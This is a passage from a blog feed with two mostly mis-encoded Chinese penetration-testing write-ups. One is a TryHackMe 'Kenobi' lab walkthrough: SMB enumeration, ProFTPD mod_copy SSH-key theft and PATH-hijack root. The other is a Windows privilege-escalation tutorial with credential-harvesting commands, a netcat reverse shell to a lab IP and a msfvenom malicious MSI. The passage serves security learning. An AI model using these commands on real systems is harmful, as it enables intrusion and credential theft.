      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kenobi</title>
    <link href="/2024/09/10/Kenobi/"/>
    <url>/2024/09/10/Kenobi/</url>
    
    <content type="html"><![CDATA[<h1 id="Kenobi"><a href="#Kenobi" class="headerlink" title="Kenobi"></a>Kenobi</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆå¯¹å…¶ç«¯å£ä¿¡æ¯è¿›è¡Œä¸€ä¸ªæ‰«æã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409101952886.png" alt="image-20240910195241621"></p><p>21 22 139 445 ä»¥åŠ80ç«¯å£å¼€æ”¾ã€‚</p><p>å…¶ä¸­sambaæœåŠ¡æ˜¯å¼€å¯çš„ã€‚</p><p>nmap æœ‰ä¸€ä¸ªè„šæœ¬æ˜¯æšä¸¾sambaå…±äº«çš„ã€‚</p><p><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.25.79</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102007890.png" alt="image-20240910200754712"></p><p>ä½¿ç”¨enum4linux ä¹Ÿèƒ½æšä¸¾sambaæœåŠ¡ã€‚</p><p>æ¯”nmapé‚£ä¸ªæ›´æ¸…æ™°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102027018.png" alt="image-20240910202710920"></p><p>æˆ‘ä»¬ä½¿ç”¨smbclientè¿æ¥åˆ°è¿œç¨‹sambaæœåŠ¡å…±äº«ã€‚</p><p>ç„¶åç»è¿‡æµ‹è¯•å‘ç°ï¼Œanonymouså’ŒIPC$ æ˜¯æ— å¯†ç çš„ï¼Œç„¶åprint$ æ— å¯†ç çš„è¯æ˜¯ç™»å½•ä¸è¿›å»çš„ï¼ŒåŒæ—¶åªæœ‰anonmous åœ¨lsä¸‹æœ‰æ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102043907.png" alt="image-20240910204322770"></p><p>é€’å½’ä¸‹è½½æ–‡ä»¶ã€‚</p><p><code>smbget -R smb:// 10.10.25.79 /anonymous</code></p><p>æˆ‘è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸‹è½½ä¸äº†â€¦</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102105651.png" alt="image-20240910210509539"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>ä¸Šé¢å¼€å¯äº†21ç«¯å£ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹ftpç™»å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112147376.png" alt="image-20240911214709282"></p><p>å‘ç°ProFTPDçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå»æœç´¢ä¸€ä¸‹å¯¹åº”çš„æ¼æ´ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112153764.png" alt="image-20240911215324642"></p><p>æœ‰4ä¸ªå¯ä»¥åˆ©ç”¨çš„ã€‚</p><p>æ¼æ´åˆ©ç”¨æ€è·¯:</p><p>å¤§ä½“ä¸Šå°±æ˜¯åˆ©ç”¨æ¼æ´å°†ç”¨æˆ·çš„sshå¯†é’¥æ–‡ä»¶ç§»åŠ¨åˆ°æˆ‘ä»¬å¯ä»¥çœ‹è§çš„æŒ‚è½½çš„åœ°æ–¹ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªsmbæœåŠ¡ï¼Œåˆ›å»ºä¸€ä¸ªå…±äº«ç›®å½•ï¼Œå°†å¯çœ‹è§çš„æŒ‚è½½çš„åœ°æ–¹æŒ‚è½½åˆ°å…±äº«ç›®å½•å»ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½åœ¨æ”»å‡»æœºä¸Šé¢å¾—åˆ°è¯¥sshç§é’¥æ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ–‡ä»¶è¿›è¡Œsshç™»å½•ã€‚ </p><p>ä¸‹é¢æ˜¯è¯¦ç»†çš„è¿‡ç¨‹ï¼š</p><p>mod_copy æ¨¡å—å®ç°äº†<strong>SITE CPFR</strong>å’Œ<strong>SITE CPTO</strong>å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å¯ç”¨äºå°†æ–‡ä»¶/ç›®å½•ä»æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªä½ç½®å¤åˆ¶åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚ä»»ä½•æœªç»èº«ä»½éªŒè¯çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥åˆ©ç”¨è¿™äº›å‘½ä»¤å°†æ–‡ä»¶ä» æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•éƒ¨åˆ†å¤åˆ¶åˆ°é€‰å®šçš„ç›®æ ‡ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ FTP æœåŠ¡ä»¥ Kenobi ç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆä»å…±äº«ä¸Šçš„æ–‡ä»¶ï¼‰ï¼Œå¹¶ä¸”ä¸ºè¯¥ç”¨æˆ·ç”Ÿæˆäº†ä¸€ä¸ª ssh å¯†é’¥ã€‚ </p><p>æˆ‘ä»¬ç°åœ¨å°† ä½¿ç”¨ SITE CPFR å’Œ SITE CPTO å‘½ä»¤å¤åˆ¶ Kenobi çš„ç§é’¥ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ /var ç›®å½•æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹è§çš„æŒ‚è½½ å› æ­¤ï¼Œæˆ‘ä»¬ç°åœ¨å°† Kenobi çš„ç§é’¥ç§»è‡³ /var/tmp ç›®å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112229521.png" alt="image-20240911222936418"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112232773.png" alt="image-20240911223222649"></p><p>ç°åœ¨/mnt/fsrm/tmpç›®å½•ä¸‹å­˜æ”¾ç€sshçš„ç§é’¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç™»å½•Kenobiç”¨æˆ·ã€‚</p><p>è®°å¾—éœ€è¦ä¿®æ”¹id_rsaçš„æƒé™ ä¿®æ”¹ä¸º600</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112308207.png" alt="image-20240911230802144"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç„¶åä¸‹é¢å°±æ˜¯å°è¯•ææƒï¼Œsudoææƒä¸å¤ªè¡Œï¼Œé‚£å°±æŸ¥çœ‹ä¸€ä¸‹å“ªäº›å…·æœ‰suidä½ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112310192.png" alt="image-20240911231003129"></p><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯/usr/bin/menu</p><p>å…ˆè¿è¡Œä¸€ä¸‹è¿™ä¸ªç¨‹åº</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112318666.png" alt="image-20240911231825571"></p><p>é€‰æ‹©1ï¼Œè¿™ä¸ªåŠŸèƒ½å°±ç›¸å½“äºcurl,ç„¶åæˆ‘ä»¬å¯ä»¥å°†/bin/sh å†™å…¥åˆ°curlä¸­ï¼Œå¹¶å°†curlè®¾ç½®æˆ777æƒé™ï¼Œç„¶åå†å°†å…¶æ·»åŠ åˆ°PATHä¸­ï¼Œå½“è¿™ä¸ªsuidç¨‹åºå†æ¬¡è¿è¡Œ1æ—¶ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªcurlã€‚</p><p>é€šè¿‡ï¼šPATH ç¯å¢ƒå˜é‡ææƒã€‚</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹$PATHé‡Œé¢æœ‰ä»€ä¹ˆã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112327635.png" alt="image-20240911232746587"></p><p>æœ‰/tmpï¼Œå¯ä»¥å°†curlæ·»åŠ åˆ°/tmpä¸­ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112322813.png" alt="image-20240911232219724"></p><p>ææƒæˆåŠŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†windowsææƒ</title>
    <link href="/2024/08/05/windows%E6%8F%90%E6%9D%83/"/>
    <url>/2024/08/05/windows%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†windowsææƒ"><a href="#åˆè¯†windowsææƒ" class="headerlink" title="åˆè¯†windowsææƒ"></a>åˆè¯†windowsææƒ</h1><p>Windowsç³»ç»Ÿåˆ†ä¸ºä¸¤ç§ä¸åŒçš„ç”¨æˆ·ï¼Œä¸€ç§æ˜¯æ‹¥æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·å±äºç®¡ç†å‘˜ç»„ï¼Œå¦ä¸€ç§æ˜¯æ‹¥æœ‰æ™®é€šç³»ç»Ÿæƒé™çš„ç”¨æˆ·ï¼Œå±äºç”¨æˆ·ç»„ã€‚</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Administrators</strong></td><td>è¿™äº›ç”¨æˆ·æ‹¥æœ‰æœ€é«˜çš„æƒé™ã€‚ä»–ä»¬å¯ä»¥æ›´æ”¹ä»»ä½•ç³»ç»Ÿé…ç½®å‚æ•°å¹¶è®¿é—®ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ã€‚</td></tr><tr><td><strong>Standard Users</strong></td><td>è¿™äº›ç”¨æˆ·å¯ä»¥è®¿é—®è®¡ç®—æœºï¼Œä½†åªèƒ½æ‰§è¡Œæœ‰é™çš„ä»»åŠ¡ã€‚é€šå¸¸ï¼Œè¿™äº›ç”¨æˆ·æ— æ³•å¯¹ç³»ç»Ÿè¿›è¡Œæ°¸ä¹…æ€§æˆ–å¿…è¦çš„æ›´æ”¹ï¼Œå¹¶ä¸”åªèƒ½è®¿é—®è‡ªå·±çš„æ–‡ä»¶ã€‚</td></tr></tbody></table><p>è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„å†…ç½®è´¦æˆ·ï¼Œç”±Windowsç³»ç»Ÿè®¾ç½®å’Œç®¡ç†ï¼Œé€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ— æ³•ä½¿ç”¨ã€‚</p><table><thead><tr><th><strong>SYSTEM / LocalSystem</strong></th><th>æ“ä½œç³»ç»Ÿç”¨äºæ‰§è¡Œå†…éƒ¨ä»»åŠ¡çš„å¸æˆ·ã€‚å®ƒå¯¹ä¸»æœºä¸Šçš„æ‰€æœ‰æ–‡ä»¶å’Œèµ„æºå…·æœ‰å®Œå…¨è®¿é—®æƒé™ï¼Œç”šè‡³æ¯”ç®¡ç†å‘˜çš„æƒé™æ›´é«˜ã€‚</th></tr></thead><tbody><tr><td><strong>Local Service</strong></td><td>ç”¨äºä»¥â€œæœ€ä½â€æƒé™è¿è¡Œ Windows æœåŠ¡çš„é»˜è®¤å¸æˆ·ã€‚å®ƒå°†ä½¿ç”¨ç½‘ç»œä¸Šçš„åŒ¿åè¿æ¥ã€‚</td></tr><tr><td><strong>Network Service</strong></td><td>ç”¨äºä»¥â€œæœ€å°â€æƒé™è¿è¡Œ Windows æœåŠ¡çš„é»˜è®¤å¸æˆ·ã€‚å®ƒå°†ä½¿ç”¨è®¡ç®—æœºå‡­æ®é€šè¿‡ç½‘ç»œè¿›è¡Œèº«ä»½éªŒè¯ã€‚</td></tr></tbody></table><p>æœ€ä½æƒé™å’Œæœ€å°æƒé™çš„åŒºåˆ«åœ¨äºï¼Œæœ€ä½æƒé™åœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ä¹Ÿä¸èƒ½è¿›è¡Œæƒé™çš„å‡çº§ï¼Œä½†æœ€å°æƒé™åœ¨ç‰¹æ®Šæƒ…å†µä¸‹å¯ä»¥è¿›è¡Œæƒé™çš„å‡çº§ï¼Œå®Œæˆä¹‹åå†é™ä¸ºæ™®é€šæƒé™ã€‚(æœ€ä½æƒé™å¼ºè°ƒçš„æ˜¯æ•´ä½“çš„ç­–ç•¥ï¼Œè€Œæœ€å°æƒé™å¼ºè°ƒçš„æ˜¯ç‰¹å®šä»»åŠ¡çš„æƒé™ç®¡ç†)</p><h2 id="ä»å¸¸è§åœ°æ–¹è·å–å¯†ç ï¼š"><a href="#ä»å¸¸è§åœ°æ–¹è·å–å¯†ç ï¼š" class="headerlink" title="ä»å¸¸è§åœ°æ–¹è·å–å¯†ç ï¼š"></a>ä»å¸¸è§åœ°æ–¹è·å–å¯†ç ï¼š</h2><h3 id="Unattended-Windows-Installations"><a href="#Unattended-Windows-Installations" class="headerlink" title="Unattended Windows Installations"></a>Unattended Windows Installations</h3><p>åœ¨å¤§é‡ä¸»æœºä¸Šå®‰è£…windowsæ—¶ï¼Œç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨windowséƒ¨ç½²æœåŠ¡ï¼Œè¯¥æœåŠ¡å…è®¸é€šè¿‡ç½‘ç»œå°†å•ä¸ªæ“ä½œç³»ç»Ÿæ˜ åƒéƒ¨ç½²åˆ°å¤šä¸ªä¸»æœºã€‚è¿™äº›ç±»å‹çš„å®‰è£…ç§°ä¸ºæ— äººå€¼å®ˆå®‰è£…ï¼Œå› ä¸ºå®ƒä»¬ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚æ­¤ç±»å®‰è£…éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜å¸æˆ·æ‰§è¡Œåˆå§‹è®¾ç½®ï¼Œæœ€ç»ˆå¯èƒ½ä¼šå­˜å‚¨åœ¨è®¡ç®—æœºçš„ä»¥ä¸‹ä½ç½®ï¼š</p><ul><li>C:\Unattend.xml</li><li>C:\Windows\Panther\Unattend.xml</li><li>C:\Windows\Panther\Unattend\Unattend.xml</li><li>C:\Windows\system32\sysprep.inf</li><li>C:\Windows\system32\sysprep\sysprep.xml</li></ul><h3 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h3><p>æ¯å½“ç”¨æˆ·ä½¿ç”¨ Powershell è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒéƒ½ä¼šè¢«å­˜å‚¨åˆ°ä¸€ä¸ªä¿å­˜è¿‡å»å‘½ä»¤è®°å¿†çš„æ–‡ä»¶ä¸­ã€‚è¿™å¯¹äºå¿«é€Ÿé‡å¤ä»¥å‰ä½¿ç”¨è¿‡çš„å‘½ä»¤éå¸¸æœ‰ç”¨ã€‚å¦‚æœç”¨æˆ·è¿è¡Œçš„å‘½ä»¤ç›´æ¥åœ¨ Powershell å‘½ä»¤è¡Œä¸­åŒ…å«å¯†ç ï¼Œæˆ‘ä»¬åˆ™å¯ä»¥åœ¨cmd.exeä¸­ä½¿ç”¨å‘½ä»¤ <code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>æ¥è·å–å†å²ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062014616.png" alt="image-20240806201435413"></p><p>ç„¶åä¸Šé¢çš„å‘½ä»¤æ˜¯åœ¨cmd.exeä¸­ç”Ÿæ•ˆï¼Œå¦‚æœåœ¨powshellä¸­çš„è¯ï¼Œéœ€è¦å°†%userprofile%æ›¿æ¢ä¸º<code>$Env:userprofile</code> </p><p>Powshell: <code>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062018345.png" alt="image-20240806201836281"></p><h3 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h3><p>Windows å…è®¸æˆ‘ä»¬ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„å‡­æ®ã€‚æ­¤åŠŸèƒ½è¿˜æä¾›äº†åœ¨ç³»ç»Ÿä¸Šä¿å­˜è¿™äº›å‡­æ®çš„é€‰é¡¹ã€‚ä»¥ä¸‹å‘½ä»¤å°†åˆ—å‡ºå·²ä¿å­˜çš„å‡­æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">cmdkey /list<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062026480.png" alt="image-20240806202601368"></p><p>æˆ‘ä»¬çœ‹ä¸åˆ°å®é™…çš„å¯†ç ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç»“åˆ<code>runas</code>å’Œ<code>/savecred</code>  ä¸€èµ·ä½¿ç”¨</p><p><code>runas /savecred /user:mike.katz cmd.exe</code></p><p>ä»¥mike.katzçš„èº«ä»½è¿è¡Œcmdï¼Œå¹¶ä½¿ç”¨/savecredå¯¹å‡­æ®è¿›è¡Œä¸€ä¸ªä¿å­˜ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062029502.png" alt="image-20240806202913360"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062031594.png" alt="image-20240806203141284"></p><h3 id="IIS-é…ç½®"><a href="#IIS-é…ç½®" class="headerlink" title="IIS é…ç½®"></a>IIS é…ç½®</h3><p>IIS(Internet ä¿¡æ¯æœåŠ¡)æ˜¯windowsä¸­é»˜è®¤å®‰è£…çš„webæœåŠ¡å™¨ï¼ŒIISçš„ç½‘ç«™é…ç½®æ–‡ä»¶å­˜å‚¨åœ¨åä¸ºweb.configçš„æ–‡ä»¶ä¸­ï¼Œé‡Œé¢å¯ä»¥å­˜æ”¾ç€æ•°æ®åº“å¯†ç æˆ–è€…èº«ä»½éªŒè¯çš„ä¸€äº›ä¿¡æ¯ã€‚</p><p>ä¸‹é¢æ˜¯å¸¸è§çš„web.configçš„å®‰è£…ä½ç½®ï¼š</p><ul><li>C:\inetpub\wwwroot\web.config</li><li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071510964.png" alt="image-20240807151007853"></p><h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><p>PuTTY æ˜¯ Windows ç³»ç»Ÿä¸Šå¸¸è§çš„ SSH å®¢æˆ·ç«¯ã€‚ç”¨æˆ·æ— éœ€æ¯æ¬¡éƒ½æŒ‡å®šè¿æ¥å‚æ•°ï¼Œè€Œæ˜¯å¯ä»¥å­˜å‚¨ä¼šè¯ï¼Œå…¶ä¸­å¯ä»¥å­˜å‚¨ IPã€ç”¨æˆ·å’Œå…¶ä»–é…ç½®ä»¥ä¾›æ—¥åä½¿ç”¨ã€‚è™½ç„¶ PuTTY ä¸å…è®¸ç”¨æˆ·å­˜å‚¨ä»–ä»¬çš„ SSHå¯†ç ï¼Œä½†å®ƒä¼šå­˜å‚¨åŒ…å«æ˜æ–‡èº«ä»½éªŒè¯å‡­æ®çš„ä»£ç†é…ç½®ã€‚</p><p>è¦æ£€ç´¢å­˜å‚¨çš„ä»£ç†å‡­æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸‹æœç´¢ ProxyPasswordï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s<br></code></pre></td></tr></table></figure><p>SimonTathamæ˜¯ä¸€ä¸ªäººåå³PuTTYçš„åˆ›ä½œè€…ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071804837.png" alt="image-20240807180431561"></p><h2 id="å…¶ä»–æ–¹æ³•ï¼š"><a href="#å…¶ä»–æ–¹æ³•ï¼š" class="headerlink" title="å…¶ä»–æ–¹æ³•ï¼š"></a>å…¶ä»–æ–¹æ³•ï¼š</h2><h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><p>ä½¿ç”¨<code>schtasks</code>åˆ—å‡ºè®¡åˆ’ä»»åŠ¡ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œä½¿ç”¨<code>schtasks /query /tn vulntask /fo list /v</code> åˆ—å‡ºvulntaskä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081649682.png" alt="image-20240808164954610"></p><p>å¯¹æˆ‘ä»¬æ¥è¯´é‡è¦çš„æ˜¯Task To Run å’ŒRun As Userè¿™ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è®¡åˆ’ä»»åŠ¡çš„å†…å®¹ï¼Œä¸€ä¸ªæ˜¯ä»¥ä»€ä¹ˆèº«ä»½æ¥è¿è¡Œè¿™ä¸ªè®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶ã€‚</p><p>å¦‚æœå½“å‰çš„ç”¨æˆ·å¯ä»¥ä¿®æ”¹æˆ–è¦†ç›–è¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¯¥ç”¨æˆ·æ‰§è¡Œçš„å†…å®¹ï¼Œä»è€Œå®ç°ç®€å•çš„æƒé™æå‡ã€‚</p><p>è¦æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>icacls</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081657726.png" alt="image-20240808165723675"></p><p>Userså¯¹è¿™ä¸ªæ–‡ä»¶å…·æœ‰Fæƒé™(å®Œå…¨è®¿é—®æƒé™ï¼Œè¿™ä¸ªæƒé™å…è®¸ç”¨æˆ·æ‰§è¡Œæ‰€æœ‰å¯èƒ½çš„æ“ä½œ)</p><p>ç„¶åå‘è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªåå¼¹shellçš„å‘½ä»¤ï¼Œå¹¶è¿è¡Œå®ƒã€‚</p><p><code>echo c:\tools\nc64.exe -e cmd.exe 10.14.74.6 4444 &gt; C:\tasks\schtask.bat</code>  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750021.png" alt="image-20240808175031930"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750486.png" alt="image-20240808175045428"></p><h3 id="å§‹ç»ˆå®‰è£…é«˜æƒé™"><a href="#å§‹ç»ˆå®‰è£…é«˜æƒé™" class="headerlink" title="å§‹ç»ˆå®‰è£…é«˜æƒé™"></a>å§‹ç»ˆå®‰è£…é«˜æƒé™</h3><p>Windows å®‰è£…ç¨‹åºæ–‡ä»¶ï¼ˆä¹Ÿç§°ä¸º .msi æ–‡ä»¶ï¼‰ç”¨äºåœ¨ç³»ç»Ÿä¸Šå®‰è£…åº”ç”¨ç¨‹åºã€‚å®ƒä»¬é€šå¸¸ä»¥å¯åŠ¨å®ƒçš„ç”¨æˆ·çš„æƒé™çº§åˆ«è¿è¡Œã€‚ä½†æ˜¯ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥é…ç½®ä¸ºä»ä»»ä½•ç”¨æˆ·å¸æˆ·ï¼ˆç”šè‡³æ˜¯éç‰¹æƒå¸æˆ·ï¼‰ä»¥æ›´é«˜çš„æƒé™è¿è¡Œã€‚è¿™å¯èƒ½å…è®¸æˆ‘ä»¬ç”Ÿæˆä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œçš„æ¶æ„ MSI æ–‡ä»¶ã€‚</p><p>æ­¤æ–¹æ³•éœ€è¦è®¾ç½®ä¸¤ä¸ªæ³¨å†Œè¡¨å€¼ï¼Œä¸‹é¢æ˜¯å‘½ä»¤ï¼š</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br><span class="hljs-name">C</span>:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨msfvenomç”Ÿæˆä¸€ä¸ªæ¶æ„çš„msiæ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi<br></code></pre></td></tr></table></figure><p>ç”±äºè¿™æ˜¯ä¸€ä¸ªåå‘ shellï¼Œè¿˜åº”è¯¥è¿è¡Œç›¸åº”é…ç½®çš„Metasploit Handler æ¨¡å—ã€‚ä¼ è¾“åˆ›å»ºçš„æ–‡ä»¶åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œå®‰è£…ç¨‹åºå¹¶æ¥æ”¶åå‘ shellï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure><h2 id="æ»¥ç”¨æœåŠ¡é”™è¯¯é…ç½®"><a href="#æ»¥ç”¨æœåŠ¡é”™è¯¯é…ç½®" class="headerlink" title="æ»¥ç”¨æœåŠ¡é”™è¯¯é…ç½®"></a>æ»¥ç”¨æœåŠ¡é”™è¯¯é…ç½®</h2><h3 id="Windows-æœåŠ¡"><a href="#Windows-æœåŠ¡" class="headerlink" title="Windows æœåŠ¡"></a>Windows æœåŠ¡</h3><p>WindowsæœåŠ¡ç”±æœåŠ¡æ§åˆ¶ç®¡ç†å™¨(SCM)ç®¡ç†,Windowsä¸Šçš„æ¯é¡¹æœåŠ¡éƒ½ä¼šæœ‰ä¸€ä¸ªå…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯å½“æœåŠ¡å¯åŠ¨æ—¶ï¼ŒSCM éƒ½ä¼šè¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¼šå®ç°ç‰¹æ®ŠåŠŸèƒ½ä»¥ä¾¿èƒ½å¤Ÿä¸ SCM é€šä¿¡ï¼Œå› æ­¤å¹¶éä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶éƒ½å¯ä»¥ä½œä¸ºæœåŠ¡æˆåŠŸå¯åŠ¨ã€‚æ¯é¡¹æœåŠ¡è¿˜æŒ‡å®šäº†è¿è¡ŒæœåŠ¡çš„ç”¨æˆ·å¸æˆ·ã€‚</p><p>ä½¿ç”¨<code>sc qc</code>æ¥æŸ¥çœ‹æŸé¡¹æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091759032.png" alt="image-20240809175925827"></p><p><strong>BINARY_PATH_NAME</strong>æŒ‡å‘çš„æ˜¯å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ<strong>SERVICE_START_NAME</strong>æŒ‡å‘çš„æ˜¯è¿è¡Œè¯¥æœåŠ¡çš„ç”¨æˆ·ã€‚</p><p>æœåŠ¡å…·æœ‰è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨(DACL) å®ƒæŒ‡ç¤ºè°æœ‰æƒå¯åŠ¨ã€åœæ­¢ã€æš‚åœã€æŸ¥è¯¢çŠ¶æ€ã€æŸ¥è¯¢é…ç½®æˆ–é‡æ–°é…ç½®æœåŠ¡ä»¥åŠå…¶ä»–ç‰¹æƒã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091807073.png" alt="image-20240809180723847"></p><p>æ‰€æœ‰æœåŠ¡é…ç½®éƒ½å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œ*<em>HKLM\SYSTEM\CurrentControlSet\Services*</em></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091808769.png" 